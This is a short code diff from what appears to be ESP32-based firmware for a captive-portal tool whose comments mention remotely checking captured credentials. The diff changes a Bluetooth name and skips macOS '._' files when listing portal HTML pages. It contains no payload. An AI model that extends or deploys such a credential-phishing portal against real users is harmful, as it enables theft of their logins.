@@ -82,7 +82,7 @@ const char* password = ""; // wifi password
 // password for web access to remote check captured credentials and send new html file !!!!!! CHANGE THIS !!!!!
 const char* accessWebPassword = "7h30th3r0n3"; // !!!!!! CHANGE THIS !!!!!
 //!!!!!! CHANGE THIS !!!!!
-const char* bluetoothName = "EM5C2";
+const char* bluetoothName = "E7vhi3l0tMh53Cro0rne32";
 //!!!!!! CHANGE THIS !!!!!
 
 
@@ -1742,7 +1742,8 @@ void listPortalFiles() {
     while (File file = root.openNextFile()) {
         if (!file.isDirectory()) {
             String fileName = file.name();
-            if (fileName.endsWith(".html")) {
+            // Ignore mac os file stating with ._ 
+            if (!fileName.startsWith("._") && fileName.endsWith(".html")) {
                 portalFiles[numPortalFiles] = String("/sites/") + fileName;
 
                 Serial.print(numPortalFiles);
@@ -1757,6 +1758,7 @@ void listPortalFiles() {
     }
     root.close();
 }
+
 
 
 void serveChangePasswordPage() {
